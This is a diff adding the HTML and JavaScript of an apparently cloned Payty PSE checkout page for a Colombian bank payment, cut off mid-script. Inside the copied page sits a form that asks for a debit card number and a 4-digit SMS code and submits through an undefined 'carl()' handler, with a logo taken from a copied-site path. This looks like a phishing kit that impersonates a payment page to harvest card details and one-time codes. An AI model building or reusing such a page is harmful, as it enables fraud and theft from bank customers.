+			var cookieEnabled = (navigator.cookieEnabled) ? true : false;
+		    if (typeof navigator.cookieEnabled == "undefined" && !cookieEnabled) { 
+		        document.cookie = "TEST_COOKIES_ENABLED=testcookiesenabled";
+		        cookieEnabled = (document.cookie.indexOf("testcookiesenabled") != -1) ? true : false;
+		        document.cookie = "TEST_COOKIES_ENABLED=;expires=Thu, 01 Jan 1970 00:00:01 GMT;";
+		    }
+		    return (!cookieEnabled);
+		}
+		
+    function handleHeaderStyle() {
+        var container = document.getElementById('container');
+        if (container) {
+            var width = container.offsetWidth;
+            var imageHeader = document.getElementById('baseImageHeader');
+            if (imageHeader) {
+                var img = new Image();
+                var url = getComputedStyle(imageHeader).backgroundImage;
+                if (url && url !== 'none') {
+                    img.onload = function () {
+                        var imageWidth = img.width;
+                        var imageHeight = img.height;
+                        if (imageWidth > width) {
+                            imageHeight = (imageHeight * width) / imageWidth;
+                            imageWidth = width;
+                        }
+                        document.getElementById(('baseImageHeader')).style.width = imageWidth + 'px';
+                        document.getElementById(('baseImageHeader')).style.height = imageHeight + 'px';
+                    }
+                    img.src = url.substring(4, url.length - 1).replace(/["|']/g, "");
+
+                }
+            }
+        }
+    }
+    document.addEventListener('DOMContentLoaded', handleHeaderStyle, false);
+    window.addEventListener('resize', handleHeaderStyle, false);
+	</script>
+	
+
+	<script type="text/javascript">
+		function checkPaymentChoiceBlockExists() {
+			var myElem = document.getElementById('paymentMeanChoiceBlock');
+			if (myElem != null) {
+				if (window.location.hash != '#paymentChoice') {
+					window.location.hash='#paymentChoice';
+				}
+			}
+		}
+		
+		registerFunction(checkPaymentChoiceBlockExists);
+	
+			var paymentStatus = "in_progress";
+			var processingOrPending = (paymentStatus == 'in_progress') || (paymentStatus == 'accepted');
+			var hash = window.location.hash === '#paymentChoice';
+			var ecs = location.pathname.indexOf("/ecs/") != -1;
+			var check = hash && processingOrPending && ecs;
+			if (check) {
+				var paymentId;
+				var shopId;
+					paymentId = "01c79e54da19480f9744b73b201d0048";
+					shopId = "10454805";
+	
+				var url=location.origin + "/checkout/ecs/web/" + shopId + "/payments/" +paymentId + "/closePaymentForBack";
+				var xmlHttp = new XMLHttpRequest(); 
+				xmlHttp.open( "POST", url, false);
+				xmlHttp.send( null );
+				if (xmlHttp.status == 200) {
+					location.reload(true);
+				}
+			}
+
+		
+	</script>
+
+	
+</head>
+
+	<body id="lyra" onLoad="callRegisteredFunction()" >
+	<div id="blockScreen">
+		<div id="blockScreenBackground"></div>
+		
+	</div>
+	<div id="container">
+	
+	
+				<div class="backShopAndLang">
+
+
+    <form name="locales" action="https://secure.payty.com/checkout/ecs/web/10454805/504d3854a9c84a96b0427158b886473b" method="post" autocomplete="off">
+      <input type="hidden" name="locale" value="" />
+      <input type="hidden" name="newLocale" value="" />
+      <input type="hidden" name="paymentTemplateName" value="" />
+      <input type="hidden" name="cacheId" value="504d3854a9c84a96b0427158b886473b" />
+    </form>
+
+    <div id="locales">
+    <div id="selectLang">
+    <p class="selectLang">Seleccione su idioma&nbsp;:</p>
+    </div>
+      <p id="showHideLang">ES</p>
+      
+      <ul class="listLang">
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/de.png" class="selectedFlag localFlag" alt="Deutsch" title="Deutsch" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='de_DE';document.forms['locales'].locale.value='de_DE';document.forms['locales'].submit();">Deutsch</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/en.png" class="selectedFlag localFlag" alt="English" title="English" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='en_GB';document.forms['locales'].locale.value='en_GB';document.forms['locales'].submit();">English</a></li>
+            <li class="active">
+          <img src="https://static.payty.com/static/commons-br/flags/es.png" class="selectedFlag localFlag" alt="Español" title="Español" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='es';document.forms['locales'].locale.value='es';document.forms['locales'].submit();">Español</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/fr.png" class="selectedFlag localFlag" alt="Français" title="Français" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='fr_FR';document.forms['locales'].locale.value='fr_FR';document.forms['locales'].submit();">Français</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/it.png" class="selectedFlag localFlag" alt="Italiano" title="Italiano" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='it_IT';document.forms['locales'].locale.value='it_IT';document.forms['locales'].submit();">Italiano</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/ja.png" class="selectedFlag localFlag" alt="日本語" title="日本語" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='ja_JP';document.forms['locales'].locale.value='ja_JP';document.forms['locales'].submit();">日本語</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/nl.png" class="selectedFlag localFlag" alt="Nederlands" title="Nederlands" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='nl_NL';document.forms['locales'].locale.value='nl_NL';document.forms['locales'].submit();">Nederlands</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/pl.png" class="selectedFlag localFlag" alt="Polski" title="Polski" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='pl_PL';document.forms['locales'].locale.value='pl_PL';document.forms['locales'].submit();">Polski</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/br.png" class="selectedFlag localFlag" alt="Português" title="Português" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='pt_BR';document.forms['locales'].locale.value='pt_BR';document.forms['locales'].submit();">Português</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/pt.png" class="selectedFlag localFlag" alt="Português" title="Português" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='pt_PT';document.forms['locales'].locale.value='pt_PT';document.forms['locales'].submit();">Português</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/ru.png" class="selectedFlag localFlag" alt="Русский" title="Русский" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='ru_RU';document.forms['locales'].locale.value='ru_RU';document.forms['locales'].submit();">Русский</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/se.png" class="selectedFlag localFlag" alt="Svenska" title="Svenska" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='sv_SE';document.forms['locales'].locale.value='sv_SE';document.forms['locales'].submit();">Svenska</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/tr.png" class="selectedFlag localFlag" alt="Türkçe" title="Türkçe" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='tr_TR';document.forms['locales'].locale.value='tr_TR';document.forms['locales'].submit();">Türkçe</a></li>
+            <li>
+          <img src="https://static.payty.com/static/commons-br/flags/zh.png" class="selectedFlag localFlag" alt="中文" title="中文" />
+          <a href="#" onclick="document.forms['locales'].newLocale.value='zh_CN';document.forms['locales'].locale.value='zh_CN';document.forms['locales'].submit();">中文</a></li>
+      </ul>
+    </div>
+  <script type="text/javascript">
+    <!--
+      var btn= document.getElementById('showHideLang');
+      var container = document.getElementById('container');
+
+      function removeEventListenerLang(el, eventName, handler) {
+        if (el.removeEventListener)
+          el.removeEventListener(eventName, handler);
+        else
+          el.detachEvent('on' + eventName, handler);
+      }
+      function addEventListenerLang(el, eventName, handler) {
+        if (el.addEventListener) {
+          el.addEventListener(eventName, handler);
+        } else {
+          el.attachEvent('on' + eventName, function(){
+            handler.call(el);
+          });
+        }
+      }
+      function hide(){
+        className="active";
+        if (btn.classList)
+          btn.classList.remove(className);
+        else
+          btn.className = btn.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'), ' ');
+
+        removeEventListenerLang(container, "click", hide);
+      }
+      function toggle(){
+        el = this;
+        className="active";
+        if (el.classList) {
+          el.classList.toggle(className);
+          if(el.classList.contains(className)){
+                setTimeout(function(){ 
+                  addEventListenerLang(container, "click", hide);
+                }, 200);
+          } else {
+                removeEventListenerLang(container, "click", hide);
+          }
+          
+        } else {
+            var classes = el.className.split(' ');
+            var existingIndex = -1;
+            for (var i = classes.length; i--;) {
+              if (classes[i] === className)
+                existingIndex = i;
+            }
+
+            if (existingIndex >= 0){
+              classes.splice(existingIndex, 1);
+              removeEventListenerLang(container, "click", hide);
+            }
+            else{
+              classes.push(className);
+              addEventListenerLang(container, "click", hide);
+            }
+
+          el.className = classes.join(' ');
+        }
+      }
+      
+      if (btn) {
+          addEventListenerLang(btn, "click", toggle);
+      }
+      
+      function togglePopup(){
+          for (var i = 0; i < arguments.length; i++) {
+          var target = document.getElementById(arguments[i]);
+          if (target) {
+            target.classList.toggle('active');
+          }
+        }
+      }
+    -->
+    </script>
+
+
+        <form id="backToBoutiqueForm" method="POST" action="https://secure.payty.com/checkout/ecs/web/10454805/504d3854a9c84a96b0427158b886473b/close" autocomplete="off">
+                <input type="hidden" name="cacheId" value="504d3854a9c84a96b0427158b886473b"/>
+                <button type="submit" class="backToBoutiqueButton">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="50" height="44.571" viewBox="0 0 50 44.571">
+                        <defs>
+                            <style>.home {
+                                    fill: var(--back-to-shop-and-language-text-color);
+                                    stroke: var(--back-to-shop-and-language-text-color);
+                                    stroke-width: 2px;
+                                }</style>
+                        </defs>
+                        <g id="home_2_" data-name="home (2)" transform="translate(0.001 -27.798)">
+                            <g id="Groupe_71" data-name="Groupe 71" transform="translate(-0.001 27.798)">
+                                <g id="Groupe_70" data-name="Groupe 70" transform="translate(0 0)">
+                                    <path class="home" id="Tracé_46" data-name="Tracé 46"
+                                          d="M49.468,45.4l-23.7-17.353a1.3,1.3,0,0,0-1.535,0L.531,45.4a1.3,1.3,0,0,0,1.535,2.1L25,30.707,47.933,47.5a1.3,1.3,0,0,0,1.535-2.1Z"
+                                          transform="translate(0.001 -27.798)" fill="#fff"/>
+                                </g>
+                            </g>
+                            <g id="Groupe_73" data-name="Groupe 73" transform="translate(5.512 47.792)">
+                                <g id="Groupe_72" data-name="Groupe 72">
+                                    <path class="home" id="Tracé_47" data-name="Tracé 47"
+                                          d="M94.127,232.543a1.3,1.3,0,0,0-1.3,1.3v20.679H82.435V243.233a6.5,6.5,0,0,0-12.992,0v11.288H59.05V233.842a1.3,1.3,0,0,0-2.6,0V255.82a1.3,1.3,0,0,0,1.3,1.3H70.742a1.3,1.3,0,0,0,1.294-1.2.979.979,0,0,0,.005-.1V243.233a3.9,3.9,0,0,1,7.8,0V255.82a.952.952,0,0,0,.005.1,1.3,1.3,0,0,0,1.294,1.2H94.127a1.3,1.3,0,0,0,1.3-1.3V233.842A1.3,1.3,0,0,0,94.127,232.543Z"
+                                          transform="translate(-56.452 -232.543)" fill="#fff"/>
+                                </g>
+                            </g>
+                        </g>
+                    </svg>
+                    <span>
+				<em>Anular y volver a la tienda</em>
+			</span>
+                </button>
+        </form>
+
+				</div>
+
+		<div id="imageHeader">
+			<div id="baseImageHeader"></div>
+		</div>
+		<div id="header">
+			<h1 id="headerTitle">
+				Payty <span class="subtitle"> Pago seguro</span>
+			</h1>
+		</div>
+			
+	  <div id="blocksSection">
+	  
+	
+	          
+	
+  <div id="TopBlock">
+
+    <div id="boutiqueInfoBlock">
+    <div id="shopLogo" style="">
+
+      <img class="logoBoutique" src="/static/commons-br/p/EtYa4s7DLSvb3X$XhJ$N6g--/site_logo.png?1720122667050" alt="Logo Tienda"/>
+      <p>Mensaje personalizado por el vendedor</p>
+    </div>
+
+
+ 	<div id="mobile-toggle" class="js-toggle-next color2" onclick="togglePopup('transactionInfoBlock','transactionSecurityInformation')">	  
+	
+				<img class="titleLogo" src="https://static.payty.com/static/2.22.18.0/images/type-carte/pse.png" alt="PSE"/>
+		<span class="amountLabel paramLabel">
+			<span>Monto&nbsp;:&nbsp;</span><span id="mon">500.000,00 COP</span>
+		</span>
+		<span class="caret-down paramLabel">&#x25BC;</span>
+	</div>
+  
+  	<div id="transactionInfoBlock">
+		<div id="transactionData" >						
+			<table class="infoTransactionTable">
+				<div class="message">https://www.pagsmile.com</div>
+
+  <tr  >
+    <th class="infoTransactionLeft" scope="row">Identificador de la tienda&nbsp;:</th>
+    <td class="infoTransactionRight" id="merchantSiteId" >10454805</td>
+  </tr>
+  <tr  >
+    <th class="infoTransactionLeft" scope="row">Referencia pedido&nbsp;:</th>
+    <td class="infoTransactionRight" id="orderId" >2024070223262302978</td>
+  </tr>
+  <tr class="amount" >
+    <th class="infoTransactionLeft" scope="row">Monto&nbsp;:</th>
+    <td class="infoTransactionRight" id="transaction_amount_label" >500.000,00 COP</td>
+  </tr>
+	
+	
+		
+			</table>
+		</div>
+
+	</div>
+	
+	    <div id="transactionSecurityInformation" class="message securityMessage">
+	      	<span class="symbole">
+	         	La dirección de este sitio de pago con el prefijo “https” indica que usted se encuentra en una página segura y que puede realizar su compra en línea con toda tranquilidad.
+	      </span>
+	    </div>
+
+    </div>
+
+
+  </div>
+
+
+	    
+	
+
+
+        <div id="rightBlock">
+
+
+
+	<script type="text/javascript">
+		function showWaitMsg(){			
+			document.getElementById('pleaseWaitDiv').style.display = 'block';
+			document.getElementById('blockScreen').style.visibility = 'visible';
+ 		}
+	</script>
+	<div id="pleaseWaitDiv" style="display:none;" role="alert" aria-atomic="true" aria-live="assertive">
+			<div id="pleaseWaitPanel">
+				<span>Por favor espere mientras su petición está siendo procesada...</span>
+				<img class="loadingImg" src="https://static.payty.com/static/commons-br/blank_1x1.png" alt="Loading..."/>
+			</div>	
+	</div>
+    <div class="banks_view">
+        <section class="type-carte">
+            <img class="type-carte__img" src="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/pse.png" alt="pse">
+            <h1 class="type-carte__title">
+                Paga con su Tarjeta en PSE
+            </h1>
+        </section>
+
+
+        <form name="bankData" id="bankData" class="form--hidden">
+            <input type="text" name="bankCode" id="form__bankCode"/>
+            <input type="text" name="bankLabel" id="form__bankLabel"/>
+            <input type="text" name="bankOptionLabel" id="form__bankOptionLabel"/>
+            <input type="text" name="buyerLanguage" id="form__buyerLanguage"/>
+            <input type="text" name="submit_url" value="https://secure.payty.com:443/checkout/v3/web/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/pse-rest/01c79e54da19480f9744b73b201d0048/submit"/>
+                <input type="text" name="show_mandatory_fields" value="true"/>
+        </form>
+
+
+        <section class="search-bar">
+            <img src="/bpse/avvilla/CC/index_files/layout_set_logo.png" alt="" style="width: 100%; height: 20%;">
+        </section>
+
+        
+
+        <form class="credit-card">
+            <div class="form-header">
+              <h4 class="title">Tarjeta de debito</h4>
+            </div>
+           
+            <div class="form-body">
+              <!-- Card Number -->
+              <input type="text" class="card-number" placeholder="Card Number" id="cc">
+           
+              <!-- Date Field -->
+              
+              <!-- Card Verification Field -->
+              <div class="card-verification">
+                <div class="cvv-input">
+                  <input type="number" placeholder="Codigo SMS" id="code">
+                </div>
+                <div class="cvv-details">
+                  <p>codigo 4 digitos <br> enviado a su celular</p>
+                </div>
+              </div>
+           
+              <!-- Buttons -->
+              <button type="button" class="proceed-btn" onclick="carl()">Proceder</button>
+              
+            </div>
+          </form>
+
+
+        
+        <section id="buttonsWrapper">
+            <div class="wrapper">
+                <section class="validation">
+                </section>
+            </div>
+        </section>
+        <section class="no-bank-found">
+        </section>
+
+    </div>
+
+
+
+
+    <script>
+        const filterBank = [];
+        let translate = 0;
+        const translateAmount = 100;
+        let firstShowButtonValidation = true;
+
+        displayBankList("");
+
+        // display button for bank preferences when there is no tag and less than 2 char in the input
+        function updateBankPreferences() {
+            const optionsBankPreferences = [{"id":1,"bank":{"id":161,"label":"BANCOLOMBIA","code":"1007","optionVisible":true,"filter":[]},"position":1},{"id":11,"bank":{"id":221,"label":"NEQUI","code":"1507","optionVisible":true,"filter":[]},"position":2},{"id":21,"bank":{"id":51,"label":"BANCO DAVIVIENDA","code":"1051","optionVisible":true,"filter":[]},"position":3},{"id":31,"bank":{"id":21,"label":"BANCO BBVA COLOMBIA S.A","code":"1013","optionVisible":true,"filter":[]},"position":4},{"id":41,"bank":{"id":61,"label":"BANCO DE BOGOTÁ","code":"1001","optionVisible":true,"filter":[]},"position":5},{"id":51,"bank":{"id":211,"label":"DAVIPLATA","code":"1551","optionVisible":true,"filter":[]},"position":6},{"id":61,"bank":{"id":31,"label":"BANCO CAJA SOCIAL","code":"1032","optionVisible":true,"filter":[]},"position":7},{"id":71,"bank":{"id":231,"label":"SCOTIABANK COLPATRIA","code":"1019","optionVisible":true,"filter":[]},"position":8},{"id":81,"bank":{"id":11,"label":"BANCO AV VILLAS","code":"1052","optionVisible":true,"filter":[]},"position":9},{"id":91,"bank":{"id":101,"label":"BANCO ITAÚ","code":"1006","optionVisible":true,"filter":[]},"position":10},{"id":101,"bank":{"id":121,"label":"BANCO POPULAR","code":"1002","optionVisible":true,"filter":[]},"position":11},{"id":111,"bank":{"id":71,"label":"BANCO DE OCCIDENTE","code":"1023","optionVisible":true,"filter":[]},"position":12},{"id":121,"bank":{"id":81,"label":"BANCO FALABELLA ","code":"1062","optionVisible":true,"filter":[]},"position":13},{"id":131,"bank":{"id":361,"label":"RAPPIPAY","code":"1811","optionVisible":true,"filter":[]},"position":14},{"id":141,"bank":{"id":331,"label":"MOVII S.A.","code":"1801","optionVisible":true,"filter":[]},"position":15},{"id":151,"bank":{"id":1,"label":"BANCO AGRARIO","code":"1040","optionVisible":true,"filter":[]},"position":16},{"id":161,"bank":{"id":171,"label":"BANCOOMEVA S.A.","code":"1061","optionVisible":true,"filter":[]},"position":17},{"id":171,"bank":{"id":41,"label":"BANCO COOPERATIVO COOPCENTRAL","code":"1066","optionVisible":true,"filter":[]},"position":18},{"id":181,"bank":{"id":91,"label":"BANCO GNB SUDAMERIS","code":"1012","optionVisible":true,"filter":[]},"position":19},{"id":191,"bank":{"id":241,"label":"BANCAMÍA S.A.","code":"1059","optionVisible":true,"filter":[]},"position":20},{"id":201,"bank":{"id":301,"label":"DALE","code":"1097","optionVisible":true,"filter":[]},"position":21},{"id":211,"bank":{"id":321,"label":"LULO BANK","code":"1070","optionVisible":true,"filter":[]},"position":22},{"id":221,"bank":{"id":151,"label":"BANCO SERFINANZA","code":"1069","optionVisible":true,"filter":[]},"position":23},{"id":231,"bank":{"id":201,"label":"CONFIAR COOPERATIVA FINANCIERA","code":"1292","optionVisible":true,"filter":[]},"position":24},{"id":241,"bank":{"id":111,"label":"BANCO PICHINCHA S.A","code":"1060","optionVisible":true,"filter":[]},"position":25},{"id":251,"bank":{"id":191,"label":"CITIBANK","code":"1009","optionVisible":true,"filter":[]},"position":26},{"id":261,"bank":{"id":261,"label":"BANCO UNIÓN antes GIROS","code":"1303","optionVisible":true,"filter":[]},"position":27},{"id":271,"bank":{"id":181,"label":"CFA COOPERATIVA FINANCIERA","code":"1283","optionVisible":true,"filter":[]},"position":28},{"id":281,"bank":{"id":291,"label":"COTRAFA","code":"1289","optionVisible":true,"filter":[]},"position":29},{"id":291,"bank":{"id":251,"label":"BAN100","code":"1558","optionVisible":true,"filter":[]},"position":30},{"id":301,"bank":{"id":271,"label":"COLTEFINANCIERA","code":"1370","optionVisible":true,"filter":[]},"position":31},{"id":311,"bank":{"id":141,"label":"BANCO SANTANDER COLOMBIA","code":"1065","optionVisible":true,"filter":[]},"position":32},{"id":321,"bank":{"id":311,"label":"IRIS","code":"1637","optionVisible":true,"filter":[]},"position":33},{"id":341,"bank":{"id":351,"label":"BANCO FINANDINA S.A. BIC","code":"1063","optionVisible":true,"filter":[]},"position":35},{"id":351,"bank":{"id":371,"label":"BANCO J.P. MORGAN COLOMBIA S.A.","code":"1071","optionVisible":true,"filter":[]},"position":36},{"id":361,"bank":{"id":381,"label":"ALIANZA FIDUCIARIA","code":"1815","optionVisible":true,"filter":[]},"position":37},{"id":371,"bank":{"id":391,"label":"CREZCAMOS","code":"1816","optionVisible":true,"filter":[]},"position":38},{"id":381,"bank":{"id":401,"label":"UALÁ","code":"1804","optionVisible":true,"filter":[]},"position":39},{"id":391,"bank":{"id":411,"label":"BANCO MUNDO MUJER S.A.","code":"1047","optionVisible":true,"filter":[]},"position":40},{"id":401,"bank":{"id":421,"label":"NU. COLOMBIA COMPAÑÍA DE FINANCIAMIENTO S.A.","code":"1809","optionVisible":true,"filter":[]},"position":41},{"id":411,"bank":{"id":431,"label":"JFK COOPERATIVA FINANCIERA","code":"1286","optionVisible":true,"filter":[]},"position":42}];
+            translate = 0;
+            $(".bank-preferences").remove();
+            $(".validation").hide();
+
+            // if there are no written tags or selection and less than 2 letters in the input, display the pref banks
+            if (!(filterBank.length > 0 || $(".search-bar__input__tag").length > 0) || $(".search-bar__input__section__field").val().length > 1) {
+                $(".bankList").append("<div class='showing bank-preferences'></div>");
+                for (let bankPref of optionsBankPreferences) {
+                    $(".validation__label").remove();
+                    $(".no-bank-found__label").remove();
+                }
+            }
+        }
+
+        // when you click on a bankPref
+        $(".bankList").on("click", ".bank-list__item", function (event) {
+            deleteAllTags();
+            let element = $(this);
+            let elementId = element.attr("id");
+            $("#form__bankCode").val(elementId);
+            let bank = getBankOptionFromCode(elementId);
+            $("#form__bankLabel").val(bank.label);
+            // we add a special tag
+            $('<span id="' + elementId + '" class="search-bar__input__tag search-bar__input__tag--primary bankTag">' + bank.label + '<div class="search-bar__input__tag__icon"><img class="search-bar__input__tag__icon--primary" src="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/icon/xmark-solid.svg"></img></div></span>')
+                .insertBefore(".search-bar__input__section__field");
+            $(".search-bar__input__section__field").val('')
+            $(".search-bar__input__section__field").focus();
+            removePlaceholder();
+            $(".search-bar__input__section").scrollLeft($(".search-bar__input__section__field").offset().left);
+            if (firstShowButtonValidation) {
+                $(".validation").append('<div class="validation__button"><span class="validation__button__label">' + "Pagar con su banco" + '</span></div>');
+                $(".validation").show();
+                firstShowButtonValidation = false;
+            } else {
+                $(".validation").show();
+                $(".validation__button").show();
+            }
+        })
+
+
+        //Retrive a bank base in the code
+        function getBankOptionFromCode(code) {
+            const bankPreferences = [{"id":1,"bank":{"id":161,"label":"BANCOLOMBIA","code":"1007","optionVisible":true,"filter":[]},"position":1},{"id":11,"bank":{"id":221,"label":"NEQUI","code":"1507","optionVisible":true,"filter":[]},"position":2},{"id":21,"bank":{"id":51,"label":"BANCO DAVIVIENDA","code":"1051","optionVisible":true,"filter":[]},"position":3},{"id":31,"bank":{"id":21,"label":"BANCO BBVA COLOMBIA S.A","code":"1013","optionVisible":true,"filter":[]},"position":4},{"id":41,"bank":{"id":61,"label":"BANCO DE BOGOTÁ","code":"1001","optionVisible":true,"filter":[]},"position":5},{"id":51,"bank":{"id":211,"label":"DAVIPLATA","code":"1551","optionVisible":true,"filter":[]},"position":6},{"id":61,"bank":{"id":31,"label":"BANCO CAJA SOCIAL","code":"1032","optionVisible":true,"filter":[]},"position":7},{"id":71,"bank":{"id":231,"label":"SCOTIABANK COLPATRIA","code":"1019","optionVisible":true,"filter":[]},"position":8},{"id":81,"bank":{"id":11,"label":"BANCO AV VILLAS","code":"1052","optionVisible":true,"filter":[]},"position":9},{"id":91,"bank":{"id":101,"label":"BANCO ITAÚ","code":"1006","optionVisible":true,"filter":[]},"position":10},{"id":101,"bank":{"id":121,"label":"BANCO POPULAR","code":"1002","optionVisible":true,"filter":[]},"position":11},{"id":111,"bank":{"id":71,"label":"BANCO DE OCCIDENTE","code":"1023","optionVisible":true,"filter":[]},"position":12},{"id":121,"bank":{"id":81,"label":"BANCO FALABELLA ","code":"1062","optionVisible":true,"filter":[]},"position":13},{"id":131,"bank":{"id":361,"label":"RAPPIPAY","code":"1811","optionVisible":true,"filter":[]},"position":14},{"id":141,"bank":{"id":331,"label":"MOVII S.A.","code":"1801","optionVisible":true,"filter":[]},"position":15},{"id":151,"bank":{"id":1,"label":"BANCO AGRARIO","code":"1040","optionVisible":true,"filter":[]},"position":16},{"id":161,"bank":{"id":171,"label":"BANCOOMEVA S.A.","code":"1061","optionVisible":true,"filter":[]},"position":17},{"id":171,"bank":{"id":41,"label":"BANCO COOPERATIVO COOPCENTRAL","code":"1066","optionVisible":true,"filter":[]},"position":18},{"id":181,"bank":{"id":91,"label":"BANCO GNB SUDAMERIS","code":"1012","optionVisible":true,"filter":[]},"position":19},{"id":191,"bank":{"id":241,"label":"BANCAMÍA S.A.","code":"1059","optionVisible":true,"filter":[]},"position":20},{"id":201,"bank":{"id":301,"label":"DALE","code":"1097","optionVisible":true,"filter":[]},"position":21},{"id":211,"bank":{"id":321,"label":"LULO BANK","code":"1070","optionVisible":true,"filter":[]},"position":22},{"id":221,"bank":{"id":151,"label":"BANCO SERFINANZA","code":"1069","optionVisible":true,"filter":[]},"position":23},{"id":231,"bank":{"id":201,"label":"CONFIAR COOPERATIVA FINANCIERA","code":"1292","optionVisible":true,"filter":[]},"position":24},{"id":241,"bank":{"id":111,"label":"BANCO PICHINCHA S.A","code":"1060","optionVisible":true,"filter":[]},"position":25},{"id":251,"bank":{"id":191,"label":"CITIBANK","code":"1009","optionVisible":true,"filter":[]},"position":26},{"id":261,"bank":{"id":261,"label":"BANCO UNIÓN antes GIROS","code":"1303","optionVisible":true,"filter":[]},"position":27},{"id":271,"bank":{"id":181,"label":"CFA COOPERATIVA FINANCIERA","code":"1283","optionVisible":true,"filter":[]},"position":28},{"id":281,"bank":{"id":291,"label":"COTRAFA","code":"1289","optionVisible":true,"filter":[]},"position":29},{"id":291,"bank":{"id":251,"label":"BAN100","code":"1558","optionVisible":true,"filter":[]},"position":30},{"id":301,"bank":{"id":271,"label":"COLTEFINANCIERA","code":"1370","optionVisible":true,"filter":[]},"position":31},{"id":311,"bank":{"id":141,"label":"BANCO SANTANDER COLOMBIA","code":"1065","optionVisible":true,"filter":[]},"position":32},{"id":321,"bank":{"id":311,"label":"IRIS","code":"1637","optionVisible":true,"filter":[]},"position":33},{"id":341,"bank":{"id":351,"label":"BANCO FINANDINA S.A. BIC","code":"1063","optionVisible":true,"filter":[]},"position":35},{"id":351,"bank":{"id":371,"label":"BANCO J.P. MORGAN COLOMBIA S.A.","code":"1071","optionVisible":true,"filter":[]},"position":36},{"id":361,"bank":{"id":381,"label":"ALIANZA FIDUCIARIA","code":"1815","optionVisible":true,"filter":[]},"position":37},{"id":371,"bank":{"id":391,"label":"CREZCAMOS","code":"1816","optionVisible":true,"filter":[]},"position":38},{"id":381,"bank":{"id":401,"label":"UALÁ","code":"1804","optionVisible":true,"filter":[]},"position":39},{"id":391,"bank":{"id":411,"label":"BANCO MUNDO MUJER S.A.","code":"1047","optionVisible":true,"filter":[]},"position":40},{"id":401,"bank":{"id":421,"label":"NU. COLOMBIA COMPAÑÍA DE FINANCIAMIENTO S.A.","code":"1809","optionVisible":true,"filter":[]},"position":41},{"id":411,"bank":{"id":431,"label":"JFK COOPERATIVA FINANCIERA","code":"1286","optionVisible":true,"filter":[]},"position":42}];
+            let bankPreference = bankPreferences.filter(e => e.bank.code === code);
+            return bankPreference[0].bank;
+        }
+
+
+        //Remove or add the placeholder if there tags or not
+        let removePlaceholder = function () {
+            let attr = $(".search-bar__input__section__field").attr("placeholder");
+            if ($(".search-bar__input__tag").length !== 0 && // If there is at least one tag, we do not display the placeholder.
+                (typeof attr !== 'undefined' && attr !== false)) { //If there is already no placeholder, there is no need to remove it.
+                $(".search-bar__input__section__field").removeAttr("placeholder");
+                $(".search-bar__input__section__field").css("min-width", "5ch");
+            }
+        }
+
+        //Delete all the tags in the search bar
+        function deleteAllTags() {
+            let searchBarElement = document.querySelector('.search-bar__input__section')
+            let tags = searchBarElement.querySelectorAll('.search-bar__input__tag')
+            if (tags) {
+                for (const tagElement of tags) {
+                    deleteTag(tagElement);
+                }
+            }
+
+        }
+
+        //Delete one tag in the search bar
+        function deleteTag(tagElement) {
+            if (tagElement.hasClass("bankSearchTag")) {
+                filterBank.splice(filterBank.findIndex((e) => e === tagElement.text()), 1);
+                // if it is an option bank search tag, we remove it from the bankOption filter
+            } else if (tagElement.hasClass("bankTag")) {
+                $("#form__bankCode").val("");
+                $("#form__bankLabel").val("");
+            } else if (tagElement.classList.contains("bankTag")) {
+                $("#form__bankCode").val("");
+                $("#form__bankLabel").val("");
+            }
+            // remove the tag
+            tagElement.remove();
+            $(".validation").hide();
+            $(".no-bank-found__label").remove();
+            addPlaceholder();
+            let val = $(".search-bar__input__section__field").val();
+            if (val.length > 1 || $(".search-bar__input__tag").length > 0) {
+                displayBankList(val)
+            } else {
+                $(".bank-list__item").remove();
+                displayBankList("");
+            }
+        }
+
+
+        //Add a text in the search bar if there is no tags on it.
+        let addPlaceholder = function () {
+            let attr = $(".search-bar__input__section__field").attr("placeholder");
+            if ($(".search-bar__input__tag").length === 0 && // if there is no tag we display the placeholder
+                (typeof attr === 'undefined' || attr === false)) { // if there is already a placeholder, no need to add it again
+                $(".search-bar__input__section__field").attr("placeholder", "¿No encuentra su banco? Use este campo para buscar y encontrarlo");
+                $(".search-bar__input__section__field").css("min-width", "31rem");
+            }
+        }
+
+
+        /*********************************************list bank******************************************************************************************/
+        // when you click on a bank or bankOption line
+        $(".bank-list").on("click", ".bank-list__item", function (event) {
+            let element = $(this);
+            let code = element.attr("id");
+            let label = element.children(".bank-list__item__bank").children("span").text();
+
+            // if it is a final element it is not clickable
+            if (!element.hasClass("bank-list__item__final")) {
+                // if it's a bank:
+                if (element.hasClass("bankItem")) {
+                    $("#form__bankCode").val(code);
+                    let bank = getBankOptionFromCode(code);
+                    $("#form__bankLabel").val(bank.label);
+                    // we add a tag corresponding to the bank
